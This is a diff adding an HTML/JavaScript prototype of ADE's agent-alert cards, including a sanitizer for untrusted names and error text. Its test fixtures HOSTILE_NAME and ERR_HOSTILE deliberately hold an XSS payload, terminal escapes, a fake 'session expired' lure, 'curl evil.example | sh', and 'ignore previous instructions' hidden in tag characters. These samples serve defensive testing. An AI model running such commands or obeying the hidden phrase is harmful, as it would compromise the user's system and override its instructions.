+      <label><input type="checkbox" data-toggle="notice"> <span>Not-typed notice bar</span></label>
+      <label><input type="checkbox" data-toggle="split"> <span>Split (two panes)</span></label>
+      <label><input type="checkbox" data-toggle="find"> <span>Terminal find bar</span></label>
+      <label><input type="checkbox" data-toggle="scratch"> <span>Scratchpad open</span></label>
+      <label><input type="checkbox" data-toggle="small"> <span>Small window</span></label>
+      <label><input type="checkbox" data-toggle="bar"> <span>Shortcut bar <small>off by default in ADE</small></span></label>
+      <label><input type="checkbox" data-toggle="topfill"> <span>New or cleared terminal <small>output starts at the top</small></span></label>
+      <label><input type="checkbox" data-toggle="stack"> <span>Split is stacked <small>top and bottom</small></span></label>
+      <label><input type="checkbox" data-toggle="active2"> <span>Second pane is the active one <small>REC and the find bar are there</small></span></label>
+      <label><input type="checkbox" data-toggle="def"> <span>ADE's default window <small>1200 × 800, Preview 480 wide</small></span></label>
+    </div>
+    <label for="kind" style="cursor:default">Tab kind in front</label>
+    <select id="kind" aria-label="Tab kind in front">
+      <option value="terminal">Terminal</option>
+      <option value="editor">Editor (a code file)</option>
+      <option value="browser">Browser</option>
+      <option value="fleet">Fleet</option>
+      <option value="orch">Orchestrator</option>
+      <option value="contracts">Contracts workbench</option>
+    </select>
+    <label for="overlay" style="cursor:default">Open over the window</label>
+    <select id="overlay" aria-label="Open over the window">
+      <option value="none">Nothing</option>
+      <option value="palette">Command palette</option>
+      <option value="dialog">A dialog (the shared overlay, at its tallest)</option>
+      <option value="cpanel">Contracts panel (at its tallest)</option>
+    </select>
+    <label><input type="checkbox" id="opt-focused" checked> <span>ADE is the focused window <small>"in view" is the active tab of a focused window</small></span></label>
+  </fieldset>
+
+  <fieldset>
+    <legend>Agent alerts (tab 2)</legend>
+    <div class="row">
+      <button data-fire="needs">Agent needs you<kbd>Alt 1</kbd></button>
+      <button data-fire="quiet">Launched agent goes quiet (today's "finished")<kbd>Alt 2</kbd></button>
+      <button data-fire="quietTask">Orchestrator task goes quiet (its title is the name)</button>
+      <button data-fire="needs3">Three agents need you at once</button>
+      <button data-fire="answer">Answer the prompt in tab 2</button>
+      <button data-fire="burst">Needs you, then "Not sent" 1 s later</button>
+      <button data-fire="subNeeds">Agent in sub-terminal "npm" of tab 2 needs you</button>
+    </div>
+  </fieldset>
+
+  <fieldset>
+    <legend>Context and project alerts</legend>
+    <div class="row">
+      <button data-fire="context">Context warning<kbd>Alt 3</kbd></button>
+      <button data-fire="question">BMAD question<kbd>Alt 4</kbd></button>
+      <button data-fire="setup">Project set up</button>
+      <button data-fire="setupAttr">Set up, attribution still on</button>
+      <button data-fire="stack">Stack detected</button>
+      <button data-fire="switched">BMAD switched</button>
+      <button data-fire="switchedOpen">Switched, archive not protected</button>
+      <button data-fire="setupWaiting">Setup waiting on a switch</button>
+      <button data-fire="setupNotDone">Setup not done (no tab)</button>
+      <button data-fire="setupFailed">Setup failed with an error</button>
+      <button data-fire="switchFailed">BMAD switch failed</button>
+    </div>
+  </fieldset>
+
+  <fieldset>
+    <legend>Contracts and terminal alerts</legend>
+    <div class="row">
+      <button data-fire="contractErr">Contract action error</button>
+      <button data-fire="contractsNone">No contracts project</button>
+      <button data-fire="contractsDetect">Contracts detect failed</button>
+      <button data-fire="notSent">Not sent<kbd>Alt 5</kbd></button>
+      <button data-fire="clear">Clear<kbd>Alt 0</kbd></button>
+    </div>
+  </fieldset>
+
+  <fieldset>
+    <legend>Text someone else typed</legend>
+    <span class="note">Names (tab, project, folder, agent):</span>
+    <div class="cols">
+      <label><input type="radio" name="nm" value="normal" checked> <span>Normal</span></label>
+      <label><input type="radio" name="nm" value="long"> <span>Long, no spaces</span></label>
+      <label><input type="radio" name="nm" value="hostile"> <span>Hostile</span></label>
+      <label><input type="radio" name="nm" value="blank"> <span>Only invisible characters</span></label>
+    </div>
+    <span class="note">Error text (setup, switch and contracts errors):</span>
+    <div class="cols">
+      <label><input type="radio" name="err" value="normal" checked> <span>Normal</span></label>
+      <label><input type="radio" name="err" value="long"> <span>Long</span></label>
+      <label><input type="radio" name="err" value="hostile"> <span>Long and hostile</span></label>
+    </div>
+  </fieldset>
+
+  <fieldset class="fu" id="fs-fu" hidden>
+    <legend>Follow-ups: switch on to see each</legend>
+    <label><input type="checkbox" data-fu="f1"> <span>F1. "Finished" from Agent status, never doubled</span></label>
+    <label><input type="checkbox" data-fu="f2"> <span>F2. Needs-you card goes when answered or opened</span></label>
+    <label><input type="checkbox" data-fu="f3"> <span>F3. Up to three cards at once</span></label>
+    <label><input type="checkbox" data-fu="f4"> <span>F4. Time holds under the pointer; errors stay 8 s</span></label>
+    <label><input type="checkbox" data-fu="f5"> <span>F5. Time holds while ADE is in the background</span></label>
+    <label><input type="checkbox" data-fu="f6"> <span>F6. Needs-you stays until answered <small>not recommended</small></span></label>
+    <label><input type="checkbox" data-fu="f7"> <span>F7. A click on the card body never dismisses</span></label>
+    <label><input type="checkbox" data-fu="f8"> <span>F8. Keyboard route: palette command, Esc in a card</span></label>
+    <label><input type="checkbox" data-fu="f9"> <span>F9. Failures of what you just did are announced at once</span></label>
+    <label><input type="checkbox" data-fu="f10"> <span>F10. Context card leaves when the folder changes, or no terminal is in front</span></label>
+    <label><input type="checkbox" data-fu="f11"> <span>F11. "Use v6" is the suggested answer</span></label>
+    <label><input type="checkbox" data-fu="f12"> <span>F12. Sub-terminal named and opened</span></label>
+    <label><input type="checkbox" data-fu="f13"> <span>F13. A top-right card steps aside to the bottom right while the palette or a dialog is open</span></label>
+  </fieldset>
+
+  <fieldset class="fu" id="fs-sim" hidden>
+    <legend>Follow-ups: the agent in tab 2, step by step</legend>
+    <label for="src" style="cursor:default">What runs there</label>
+    <select id="src" aria-label="What runs in tab 2">
+      <option value="claudeOn">Claude Code, Agent status on</option>
+      <option value="claudeOff">Claude Code, Agent status off</option>
+      <option value="codex">Codex or Ollama (no hooks)</option>
+      <option value="windows">Any agent on Windows (no Agent status)</option>
+    </select>
+    <label><input type="checkbox" id="opt-tracked" checked> <span>Launched from ADE <small>picker, orchestrator or launch command. Unticked: started by hand</small></span></label>
+    <div class="row">
+      <button data-fire="simLaunch">Launch</button>
+      <button data-fire="simPrompt">Prompt sent</button>
+      <button data-fire="simSilence">3 s of silence</button>
+      <button data-fire="simPerm">Permission prompt</button>
+      <button data-fire="simAnswer">Answer it</button>
+      <button data-fire="simStop">Turn ends (Stop)</button>
+      <button data-fire="simEnd">Session ends</button>
+      <button data-fire="simHooksOn">Turn Agent status on now</button>
+      <button data-fire="simCd">cd to another folder (active terminal)</button>
+      <button data-fire="simGoto">Palette: "Alerts: Focus the alert"<kbd>Alt G</kbd></button>
+    </div>
+    <span class="note">Worked cases (spec F1):</span>
+    <div class="row">
+      <button data-fire="case1">1. Thinking pause, then the turn ends</button>
+      <button data-fire="case2">2. Codex goes quiet</button>
+      <button data-fire="case3">3. Agent status turned on mid-turn</button>
+      <button data-fire="case4">4. claude -p (ends at once)</button>
+      <button data-fire="case5">5. Two panes: one needs you, the other ends its turn</button>
+      <button data-fire="case6">6. Claude started by hand</button>
+      <button data-fire="caseQ">A BMAD question is up, then a turn ends in tab 2</button>
+      <button data-fire="caseQS">A BMAD question is up, then Codex goes quiet</button>
+    </div>
+  </fieldset>
+
+  <fieldset>
+    <legend>Look</legend>
+    <label for="theme" style="cursor:default">Theme preset</label>
+    <select id="theme" aria-label="Theme preset"></select>
+    <label><input type="checkbox" id="rm"> <span>Reduced motion</span></label>
+    <label><input type="checkbox" id="fast"> <span>Lifetimes 5 times shorter <small>for trying things quickly</small></span></label>
+  </fieldset>
+
+  <fieldset>
+    <legend>What happened</legend>
+    <ol id="log" aria-label="Event log"></ol>
+  </fieldset>
+</aside>
+
+<main class="stage">
+  <div class="banner">Follow-ups view. Nothing here is part of the restyle. Each switch is a separate behaviour change the owner can take or leave.</div>
+  <div class="stage__cap" id="cap"></div>
+  <div class="stage__covers" id="covers" aria-live="off"></div>
+  <div class="win" id="win" data-edgefix="on">
+    <div class="tabbar" role="tablist" aria-label="Tabs (stand-in)" id="tabbar"></div>
+    <div class="mid">
+      <div class="col" id="col">
+        <div class="strip" data-piece="strip" data-name="the sub-terminal strip" hidden><span class="on">shop</span><i></i><span>npm</span><span>claude: auth</span></div>
+        <div class="notice" data-piece="notice" hidden><b aria-hidden="true">!</b><span>The command (<code>npm …</code>) wasn't typed: the shell was busy.</span><span style="flex:0 0 auto;display:flex;gap:8px" id="notice-btns" data-name="the not-typed bar's buttons"><button type="button" tabindex="-1">Insert command</button><button type="button" tabindex="-1">Dismiss</button></span></div>
+        <div class="panes" id="panes" data-piece="panes">
+          <div class="pane active" id="pane1">
+            <div class="phead"><span class="badge">1</span><span class="cwd" data-name="a pane header's folder path">~/code/shop</span><button type="button" tabindex="-1" class="rec" data-name="the pane header's REC button (starts or stops a recording)" title="Start Recording">REC</button></div>
+            <div class="find" data-piece="find" data-name="the terminal find bar" id="find1" hidden><div>Search...</div><span>Aa</span><span>.*</span><span>↑</span><span>↓</span><span>×</span></div>
+            <div class="fresh" data-name="the first lines of a new terminal (the shell prompt and the newest output)"><div class="ln">dev@mac shop % claude</div><div class="ln"> </div><div class="ln"><u>✻</u> <b>Welcome to Claude Code</b>   /help for help, /status for your current setup</div><div class="ln">  cwd: /Users/dev/code/shop</div></div>
+            <div class="ln old">$ claude</div>
+            <div class="ln old"><b>&gt; add a retry to the payment webhook and run the tests</b></div>
+            <div class="ln old"> </div>
+            <div class="ln old"><i>●</i> I'll read the handler first.</div>
+            <div class="ln old">  Read(src/webhooks/payment.ts)  <u>214 lines</u></div>
+            <div class="ln old">  Update(src/webhooks/payment.ts)  <u>+31 -4</u></div>
+            <div class="ln old"><i>●</i> Added retryWithBackoff: three attempts, 200 ms base, jitter, and a cap of 2 s on any single wait.</div>
+            <div class="ln old">  Bash(npm test -- webhooks)</div>
+            <div class="ln old">    PASS  src/webhooks/payment.test.ts  (14 tests)</div>
+            <div class="ln old">    PASS  src/webhooks/retry.test.ts    (6 tests)</div>
+            <div class="ln old"> </div>
+            <div class="ln old" data-name="the newest output above the prompt"><i>●</i> All 20 tests pass. The handler now retries a 5xx from the ledger three times before it gives up and queues the event.</div>
+            <div class="ln"> </div>
+            <div class="prompt" id="promptbox" data-name="Claude Code's input box"><span>&gt;</span><textarea id="term" aria-label="Stand-in terminal" spellcheck="false" placeholder="Stand-in terminal: type here."></textarea></div>
+            <div class="statusline" id="statusline" data-name="Claude Code's status line"><span>? for shortcuts</span><span>auto-accept edits on · 164k tokens</span></div>
+          </div>
+          <div class="pane" id="pane2" data-piece="split" hidden>
+            <div class="phead"><span class="badge">2</span><span class="cwd" data-name="a pane header's folder path">~/code/shop/web</span><button type="button" tabindex="-1" class="rec" data-name="the pane header's REC button (starts or stops a recording)" title="Start Recording">REC</button></div>
+            <div class="find" data-piece="find" data-name="the terminal find bar" id="find2" hidden><div>Search...</div><span>Aa</span><span>.*</span><span>↑</span><span>↓</span><span>×</span></div>
+            <div class="ln">$ npm run dev</div>
+            <div class="ln">  VITE v5.4.2  ready in 412 ms</div>
+            <div class="ln">  ➜  Local:   localhost:5173</div>
+            <div data-name="the newest output in the right pane"><div class="ln">  12:04:11 [vite] hmr update /src/App.tsx</div>
+            <div class="ln">  12:04:19 [vite] hmr update /src/webhooks/payment.ts</div>
+            <div class="ln">  12:04:31 [vite] page reload src/webhooks/retry.ts</div></div>
+          </div>
+        </div>
+        <div class="editor" data-piece="editor" hidden>
+          <div class="gut">1
+2
+3
+4
+5
+6
+7
+8
+9
+10</div>
+          <div class="code"><pre>export async function retryWithBackoff&lt;T&gt;(run: () =&gt; Promise&lt;T&gt;, attempts = 3, baseMs = 200): Promise&lt;T&gt; {
+  let last: unknown;
+  for (let i = 0; i &lt; attempts; i++) {
+    try { return await run(); } catch (e) { last = e; }
+    await sleep(Math.min(2000, baseMs * 2 ** i + Math.random() * baseMs));
+  }
+  throw last;
+}</pre><textarea id="edit" aria-label="Stand-in editor" spellcheck="false" placeholder="Stand-in editor: type here."></textarea></div>
+          <div class="minimap" id="minimap" data-name="the editor's minimap"></div>
+        </div>
+        <div class="kv browser" data-kindview="browser" hidden>
+          <div class="kv-bar"><button type="button" tabindex="-1" class="ic" aria-label="Refresh (stand-in)">↻</button><input id="url" data-name="the browser tab's URL field" value="http://localhost:5173/checkout" aria-label="Stand-in URL field" spellcheck="false"><button type="button" tabindex="-1" class="go" data-name="the browser tab's Go button">Go</button></div>
+          <div class="kv-body" data-name="the web page">Checkout<br><br>The page of a local dev server. Whatever the page puts in its own corners is under the card too.</div>
+        </div>
+        <div class="kv fleet" data-kindview="fleet" hidden>
+          <div class="kv-bar"><b>Fleet</b><span>This project</span><span class="grow">3 running · 5 done · $1.42</span><span class="ranges" data-name="the fleet tab's range buttons"><button type="button" tabindex="-1">5m</button><button type="button" tabindex="-1">15m</button><button type="button" tabindex="-1">1h</button><button type="button" tabindex="-1">all</button></span><button type="button" tabindex="-1" data-name="the fleet tab's Clear history button (clears at once)">Clear history</button></div>
+          <div class="kv-body" id="fleet-body" tabindex="0" aria-label="Stand-in fleet timeline"><div class="lane" style="width:70%"></div><div class="lane" style="width:45%;margin-left:20%"></div><div class="lane" style="width:30%;margin-left:60%"></div></div>
+          <div class="kv-foot"><span><b>claude: auth</b></span><span>model: opus</span><span>12:01:10 → running</span><button type="button" tabindex="-1" data-name="the fleet tab's selection line (its close button)">✕</button></div>
+        </div>
+        <div class="kv orch" data-kindview="orch" hidden>
+          <div class="chat" id="orch-chat" tabindex="0" aria-label="Stand-in orchestrator chat">Plan: split the checkout work into three tasks and dispatch them.</div>
+          <div class="tasks">
+            <div class="head"><span>Tasks (3)</span><button type="button" tabindex="-1" data-name="the orchestrator's Dispatch All button">Dispatch All</button></div>
+            <div class="list"><div class="task"><b>Implement the login form and write tests</b>Pending<div><button type="button" tabindex="-1" class="go" data-name="an open task's Dispatch button">Dispatch</button></div></div><div class="task"><b>Add a retry to the payment webhook</b>Running</div><div class="task"><b>Document the ledger contract tests</b>Pending</div></div>
+            <div class="foot" data-name="the orchestrator's task count line">1 running · 2 pending</div>
+          </div>
+        </div>
+        <div class="kv bench" data-kindview="contracts" hidden>
+          <div class="kv-bar"><strong>Contracts</strong><span class="root">/code/shop/contracts</span><button type="button" tabindex="-1" class="pri">Compile</button><span class="grow"></span><span class="tabs" data-name="the contracts tab's Tests / Deploy &amp; call switch"><button type="button" tabindex="-1" aria-selected="true">Tests</button><button type="button" tabindex="-1">Deploy &amp; call</button></span></div>
+          <div class="kv-body"><div class="tools"><button type="button" tabindex="-1" class="pri">Run all</button><input id="bench-filter" placeholder="Filter tests…" aria-label="Stand-in test filter"></div>
+            <section class="suite"><header><span>test/Vault.t.sol</span><b>VaultTest</b><span class="grow"></span><button type="button" tabindex="-1" data-name="a test suite's Run button">Run 14</button></header><div id="bench-rows"></div></section>
+          </div>
+        </div>
+      </div>
+      <div class="side" data-piece="side" hidden>
+        <header id="sidehead" data-name="the Preview panel's header"><span>README.md</span><button type="button" tabindex="-1" aria-label="Refresh (stand-in)">↻</button><button type="button" tabindex="-1" aria-label="Close (stand-in)">×</button></header>
+        <div class="doc" id="sidedoc" data-name="the Preview panel's content"><h4>Payments service</h4>Handles webhooks from the processor and writes to the ledger. Retries are bounded; a failed event is queued and replayed by the nightly job.<br><br>Run <code>npm test</code> before pushing. The contract tests need a local ledger: see docs/ledger.md.</div>
+      </div>
+    </div>
+    <div class="scratch" data-piece="scratch" id="scratch" data-name="the scratchpad" hidden><div>Scratchpad</div><button type="button" tabindex="-1">Send</button></div>
+    <div class="shortcuts" id="shortcuts" data-piece="bar" hidden><span>⌘T New tab</span><span>⌘P Palette</span><span>⌘K Tabs</span><span>⌘F Find</span></div>
+    <div class="ov palette" data-ov="palette" hidden><div class="box"><div class="in"><div data-name="the command palette's input">Type a command...</div></div><div class="rows" data-name="the command palette's results" id="pal-rows"></div></div></div>
+    <div class="ov dialog" data-ov="dialog" hidden><div class="box"><header><span>New tab</span><button type="button" tabindex="-1" data-name="a dialog's close button (right end of its header)">✕</button></header><div class="body" data-name="a dialog's body">A dialog drawn at its tallest: 80% of the window's height.</div><footer><span data-name="a dialog's footer buttons"><button type="button" tabindex="-1">Cancel</button><button type="button" tabindex="-1">Create</button></span></footer></div></div>
+    <div class="ov cpanel" data-ov="cpanel" hidden><div class="box"><header><span>Contracts</span><span><button type="button" tabindex="-1" data-name="the Contracts panel's Open workbench button">Open workbench</button> <button type="button" tabindex="-1" data-name="the Contracts panel's close button">✕</button></span></header><div class="body" data-name="the Contracts panel's content">The Contracts panel drawn at its tallest.</div></div></div>
+    <!-- Present from launch, empty: a screen reader hears text put into a region that already exists. The restyle has this one region; the second (assertive) one exists only while F9 is switched on. -->
+    <div class="sr-only" id="say-polite" aria-live="polite"></div>
+    <div class="slot" id="slot" data-place="A"></div>
+  </div>
+</main>
+
+<script>
+"use strict";
+/* The nine presets, from src/stores/settingsStore.ts (THEME_PRESETS, UI colours only). */
+const THEMES = [
+  ["Precision", "#0A0B0D", "#0F1013", "#15171B", "#1B1E23", "#262A31", "#E8EAED", "#9BA1AC", "#5A616D", "#7C8FFF", "#4A5FE0", "#4CC38A", "#F4756B", "#D9A441", "rgba(255, 255, 255, 0.055)", "rgba(255, 255, 255, 0.10)"],
+  ["GitHub Dark", "#0d1117", "#161b22", "#1c2128", "#21262d", "#30363d", "#e6edf3", "#8b949e", "#484f58", "#58a6ff", "#2F6FD0", "#3fb950", "#ff7b72", "#d29922", "rgba(240, 246, 252, 0.1)", "rgba(240, 246, 252, 0.15)"],
+  ["Dracula", "#282a36", "#21222c", "#2d2f3d", "#343746", "#44475a", "#f8f8f2", "#b0b8d1", "#6272a4", "#bd93f9", "#6D50C4", "#50fa7b", "#ff5555", "#f1fa8c", "rgba(248, 248, 242, 0.1)", "rgba(248, 248, 242, 0.15)"],
+  ["Monokai Pro", "#2d2a2e", "#221f22", "#363337", "#403e41", "#5b595c", "#fcfcfa", "#c1c0c0", "#727072", "#ffd866", "#38788F", "#a9dc76", "#f92672", "#e6db74", "rgba(252, 252, 250, 0.1)", "rgba(252, 252, 250, 0.15)"],
+  ["Nord", "#2e3440", "#272c36", "#353b49", "#3b4252", "#434c5e", "#eceff4", "#d8dee9", "#4c566a", "#88c0d0", "#52719A", "#a3be8c", "#bf616a", "#ebcb8b", "rgba(236, 239, 244, 0.1)", "rgba(236, 239, 244, 0.15)"],
+  ["Catppuccin Mocha", "#1e1e2e", "#181825", "#252536", "#313244", "#45475a", "#cdd6f4", "#bac2de", "#585b70", "#89b4fa", "#5C6FA5", "#a6e3a1", "#f38ba8", "#f9e2af", "rgba(205, 214, 244, 0.1)", "rgba(205, 214, 244, 0.15)"],
+  ["Solarized Dark", "#002b36", "#001f27", "#073642", "#0a4050", "#586e75", "#fdf6e3", "#93a1a1", "#586e75", "#268bd2", "#1F6E8C", "#859900", "#dc322f", "#b58900", "rgba(253, 246, 227, 0.1)", "rgba(253, 246, 227, 0.15)"],
+  ["Tokyo Night", "#1a1b26", "#16161e", "#1f2030", "#24283b", "#414868", "#c0caf5", "#a9b1d6", "#565f89", "#7aa2f7", "#3D59A1", "#9ece6a", "#f7768e", "#e0af68", "rgba(192, 202, 245, 0.1)", "rgba(192, 202, 245, 0.15)"],
+  ["One Dark", "#282c34", "#21252b", "#2c313a", "#333842", "#3e4451", "#abb2bf", "#9da5b4", "#5c6370", "#61afef", "#3B73A9", "#98c379", "#e06c75", "#e5c07b", "rgba(171, 178, 191, 0.1)", "rgba(171, 178, 191, 0.15)"],
+];
+const VARS = ["--bg-primary", "--bg-secondary", "--bg-tertiary", "--bg-elevated", "--bg-surface", "--text-primary", "--text-secondary", "--text-muted", "--accent", "--accent-solid", "--green", "--red", "--yellow", "--border", "--border-strong"];
+
+const $ = (s, r = document) => r.querySelector(s);
+const $$ = (s, r = document) => [...r.querySelectorAll(s)];
+const win = $("#win"), term = $("#term"), edit = $("#edit"), tabbar = $("#tabbar"), logEl = $("#log"), cap = $("#cap"), coversEl = $("#covers");
+const slot = $("#slot"), col = $("#col"), panes = $("#panes"), sayPolite = $("#say-polite");
+const el = (tag, cls, text) => { const n = document.createElement(tag); if (cls) n.className = cls; if (text != null) n.textContent = text; return n; };
+
+/* ==================================================================
+   The cleaning rule (spec B5). One function for every piece of text
+   ADE did not write: names and error text alike. No control or
+   direction character is written in this file: every one is built
+   from its code point.
+   ================================================================== */
+const cp = String.fromCodePoint;
+const cls = (ranges) => ranges.map((r) => (Array.isArray(r) ? `\\u{${r[0].toString(16)}}-\\u{${r[1].toString(16)}}` : `\\u{${r.toString(16)}}`)).join("");
+const E = "\\u{1b}";
+/* 1. Removed: every default-ignorable code point (Unicode's own property for characters that draw nothing: soft hyphen, zero-width space,
+      direction marks, embeddings, overrides and isolates, word joiner, invisible operators, the byte-order mark, the combining grapheme joiner,
+      tag characters, and the unassigned ones reserved for the same use), plus the interlinear annotation marks.
+      Three kinds are decided one by one: fillers go to step 3; a joiner or a variation selector stays only next to a character it acts on. */
+const RE_IGNORABLE = new RegExp(`[\\p{Default_Ignorable_Code_Point}${cls([[0xFFF9, 0xFFFB]])}]`, "u");
+const FILLER = new Set([0x115F, 0x1160, 0x3164, 0xFFA0]);
+const isVS = (c) => (c >= 0xFE00 && c <= 0xFE0F) || (c >= 0xE0100 && c <= 0xE01EF) || (c >= 0x180B && c <= 0x180D) || c === 0x180F;
+/* The scripts that use U+200C and U+200D: the cursive ones and the Indic ones. Between letters of any other script they act on nothing. */
+const JOINING = ["Arabic", "Syriac", "Mandaic", "Mongolian", "Nko", "Phags_Pa", "Adlam", "Hanifi_Rohingya", "Devanagari", "Bengali", "Gurmukhi", "Gujarati", "Oriya", "Tamil", "Telugu", "Kannada", "Malayalam", "Sinhala", "Myanmar", "Khmer", "Tibetan", "Balinese", "Javanese"];
+const RE_JOINS = new RegExp(`^(?=[\\p{L}\\p{M}])[${JOINING.map((x) => `\\p{scx=${x}}`).join("")}]$`, "u");
+const RE_EMOJI = new RegExp("^[\\p{Extended_Pictographic}\\p{Emoji_Modifier}]$", "u");
+const RE_PICT = new RegExp("^\\p{Extended_Pictographic}$", "u");
+const RE_BASE = new RegExp("^[^\\s\\p{Cc}\\p{Default_Ignorable_Code_Point}]$", "u");
+function dropIgnorable(s) {
+  const a = Array.from(s), out = [];
+  for (let i = 0; i < a.length; i++) {
+    const ch = a[i], c = ch.codePointAt(0), prev = out[out.length - 1], next = a[i + 1];
+    if (FILLER.has(c)) { out.push(ch); continue; }
+    if (c === 0x200C || c === 0x200D) {
+      const joins = prev && next && RE_JOINS.test(prev) && RE_JOINS.test(next);                                                       // between two letters or marks of a script that uses it
+      const emoji = c === 0x200D && prev && next && (RE_EMOJI.test(prev) || prev.codePointAt(0) === 0xFE0F) && RE_PICT.test(next);    // between two emoji
+      if (joins || emoji) out.push(ch);
+      continue;
+    }
+    if (isVS(c)) { if (prev && RE_BASE.test(prev)) out.push(ch); continue; }                                                          // straight after a visible character, once
+    if (RE_IGNORABLE.test(ch)) continue;
+    out.push(ch);
+  }
+  return out.join("");
+}
+/* 2. Terminal escape sequences, removed whole, so no "[31m" is left behind. A string sequence (OSC, DCS, APC, PM, SOS) counts only when its
+      terminator comes within 256 characters; without one only its introducer goes, so an unterminated sequence cannot take the rest of the message. */
+const ST = `(?:\\u{7}|${E}\\\\|\\u{9c})`;
+const RE_SEQ = new RegExp(
+  `(?:${E}[\\]P_^X]|[\\u{9d}\\u{90}\\u{9f}\\u{9e}\\u{98}])[^\\u{7}\\u{1b}\\u{9c}]{0,256}?${ST}` +   // OSC (title, hyperlink), DCS, APC, PM, SOS, with the payload
+  `|(?:${E}\\[|\\u{9b})[\\u{30}-\\u{3f}]*[\\u{20}-\\u{2f}]*[\\u{40}-\\u{7e}]?` +                    // CSI (colours, cursor moves), also one cut off before its final byte
+  `|${E}[\\u{20}-\\u{2f}]*[\\u{30}-\\u{7e}]`, "gu");                                               // any other escape pair, and the introducer of an unterminated string sequence
+/* 3. Replaced by a space: acts as a break, or draws as a blank without being white space. */
+const SPACED = [[0x00, 0x1F], [0x7F, 0x9F], [0x2028, 0x2029], [0x115F, 0x1160], 0x2800, 0x3164, 0xFFA0, 0xFFFC, 0x1D159];
+const RE_SPACED = new RegExp(`[${cls(SPACED)}]`, "gu");
+/* 4. More than four combining marks in a row: the rest are dropped (they draw outside the line). A joiner between marks does not restart the count. */
+const JV = cls([0x200C, 0x200D]);
+const RE_MARKRUN = new RegExp(`(?:\\p{M}[${JV}]*){5,}`, "gu");
+const RE_TRAILJ = new RegExp(`[${JV}]+$`, "u");
+const RE_MARK = new RegExp("\\p{M}", "u");
+const capMarks = (run) => { let k = 0, out = ""; for (const ch of run) { if (RE_MARK.test(ch) && ++k > 4) break; out += ch; } return out.replace(RE_TRAILJ, ""); };
+/* 5. No grapheme keeps more than 12 code points, so a cap counted in graphemes is also a cap in code points (24 graphemes: 288 at most). */
+const seg = typeof Intl !== "undefined" && Intl.Segmenter ? new Intl.Segmenter(undefined, { granularity: "grapheme" }) : null;
+const capG = (g) => { const a = Array.from(g); return a.length > 12 ? a.slice(0, 12).join("").replace(RE_TRAILJ, "") : g; };
+const graphemes = (s) => (seg ? [...seg.segment(s)].map((x) => capG(x.segment)) : Array.from(s));
+/* 7. Nothing visible left (only white space, marks or format characters): the caller's placeholder is used. */
+const RE_VISIBLE = new RegExp("[^\\s\\p{Cc}\\p{Cf}\\p{M}\\p{Default_Ignorable_Code_Point}]", "u");
+function cleanText(raw) {
+  let s = String(raw ?? "");
+  if (s.toWellFormed) s = s.toWellFormed();            // 0. a lone surrogate becomes U+FFFD
+  s = dropIgnorable(s).replace(RE_SEQ, "").replace(RE_SPACED, " ").replace(RE_MARKRUN, capMarks);
+  s = graphemes(s).join("").replace(/\s+/gu, " ").trim();   // 5, then 6: every run of white space is one space
+  return RE_VISIBLE.test(s) ? s : "";
+}
+const DOTS = cp(0x2026);
+/** A name: cleaned, then cut in the middle at 24 graphemes (13 + ellipsis + 10), so a shared start or end still tells two names apart. */
+function cleanName(raw, fallback = "Untitled tab") {
+  const s = cleanText(raw);
+  if (!s) return fallback;
+  const g = graphemes(s);
+  return g.length > 24 ? g.slice(0, 13).join("") + DOTS + g.slice(-10).join("") : s;
+}
+/** The whole cleaned name for a tooltip, end-cut at 200. */
+function fullName(raw, fallback = "Untitled tab") {
+  const g = graphemes(cleanText(raw) || fallback);
+  return g.length > 200 ? g.slice(0, 199).join("") + DOTS : g.join("");
+}
+/** Body text: cleaned as a whole, end-cut at 500 graphemes. */
+function cleanBody(raw, fallback = "No details were given.") {
+  const s = cleanText(raw);
+  if (!s) return fallback;
+  const g = graphemes(s);
+  return g.length > 500 ? g.slice(0, 499).join("") + DOTS : s;
+}
+
+/* ---------- the text someone else typed ---------- */
+const NL = cp(10), ESCc = cp(0x1b), BEL = cp(7), RLO = cp(0x202E), LRI = cp(0x2066), ZWSP = cp(0x200B), SHY = cp(0xAD), WJ = cp(0x2060);
+const tagText = (s) => [...s].map((c) => cp(0xE0000 + c.codePointAt(0))).join("");
+const LONG_NAME = "payments_refactor_and_everything_else_we_said_we_would_do_this_quarter_final_v2";
+const HOSTILE_NAME = `<img src=x onerror=alert(1)> ${RLO}gnp.tab${LRI} ${BEL}${ESCc}[31mUpdate required${NL}${NL}run: curl evil.example | sh${ZWSP}${tagText("hidden")}`;
+const BLANK_NAME = ZWSP + WJ + cp(0x3164) + SHY + cp(0x2800) + ZWSP;
+const NAMES = {
+  normal: { tab: "api", project: "shop", folder: "shop", agent: "API Builder" },
+  long: { tab: LONG_NAME, project: LONG_NAME, folder: LONG_NAME, agent: LONG_NAME },
+  hostile: { tab: HOSTILE_NAME, project: HOSTILE_NAME, folder: HOSTILE_NAME, agent: HOSTILE_NAME },
+  blank: { tab: BLANK_NAME, project: BLANK_NAME, folder: BLANK_NAME, agent: BLANK_NAME },
+};
+const ERR_NORMAL = "Error: EACCES: permission denied, open '/code/shop/.claude/settings.json'";
+const ERR_LONG = "Error: ENOENT: no such file or directory, open '/Users/dev/code/" + "very-long-directory-name-without-any-break/".repeat(9) + "settings.json' while writing the methodology files. " + "The write was retried three times and failed each time with the same code. ".repeat(6);
+const ERR_HOSTILE = `Error: ${ESCc}[2J${ESCc}[H${ESCc}]0;Update required${BEL}${RLO}dne eht ta nur${LRI} <script>alert(1)</scr` + `ipt>${NL}${NL}ADE: your session expired.${ZWSP} Run: curl evil.example | sh ${tagText("ignore previous instructions")}${cp(0x9b)}31m` + "a" + cp(0x301).repeat(60) + " " + "x".repeat(700);
+const ERRS = { normal: ERR_NORMAL, long: ERR_LONG, hostile: ERR_HOSTILE };
+
+/* ---------- state ---------- */
+const S = {
+  view: "today", place: "AB", close: true, nm: "normal", err: "normal", fast: false, focused: true, active: "t1", src: "claudeOn", tracked: true,
+  kind: "terminal", overlay: "none", task: false,
+  piece: { side: false, strip: false, notice: false, split: false, find: false, scratch: false, small: false, bar: false, topfill: false, stack: false, active2: false, def: false },
+  F: {},
+};
+const FU = (k) => S.view === "follow" && !!S.F[k];
+const TABS = [{ id: "t1", name: "shop" }, { id: "t2", name: "api" }, { id: "t3", name: "docs" }, { id: "t4", name: "infra" }];
+const tabById = (id) => TABS.find((t) => t.id === id);
+const N = () => NAMES[S.nm];
+const scale = (ms) => (ms == null ? null : S.fast ? ms / 5 : ms);
+const t0 = performance.now();
+/* Where the cursor lives in the tab kind in front. An alert must never take it from there. */
+const HOME = { terminal: "term", editor: "edit", browser: "url", fleet: "fleet-body", orch: "orch-chat", contracts: "bench-filter" };
+const home = () => $("#" + HOME[S.kind]);
